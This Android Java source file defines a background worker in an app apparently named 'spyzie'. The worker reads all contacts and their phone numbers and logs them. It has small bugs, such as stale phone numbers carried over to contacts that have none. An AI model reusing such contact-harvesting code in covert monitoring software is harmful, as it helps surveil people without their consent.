package com.tantd.spyzie.data.device.worker;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.tantd.spyzie.data.model.Contact;
import com.tantd.spyzie.util.CommonUtils;
import com.tantd.spyzie.util.Constants;

import java.util.ArrayList;
import java.util.List;

public class GetContactsWorker extends Worker {

    public GetContactsWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        if (CommonUtils.checkReadContactsPermission(getApplicationContext())) {
            printContacts(getAllContacts());
        } else {
            Toast.makeText(getApplicationContext(), "Have no permission", Toast.LENGTH_SHORT).show();
        }
        return Result.success();
    }

    private List<Contact> getAllContacts() {
        List<Contact> contacts = new ArrayList<>();
        ContentResolver contentResolver = getApplicationContext().getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI
                , null, null, null, null);
        List<String> phone = null;
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    phone = getPhoneNumber(contentResolver, id);
                }
                contacts.add(new Contact(id, name, phone));
            }
        }
        if (cursor != null) {
            cursor.close();
        }
        return contacts;
    }

    private List<String> getPhoneNumber(ContentResolver contentResolver, String id) {
        List<String> numbers = new ArrayList<>();
        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                , null
                , ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?"
                , new String[]{id}, null);
        while (cursor.moveToNext()) {
            String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            numbers.add(phoneNumber);
        }
        cursor.close();
        return numbers;
    }

    private void printContacts(List<Contact> contacts) {
        for (Contact contact :
                contacts) {
            Log.d(Constants.LOG_TAG, "" + contact);
        }
    }
}
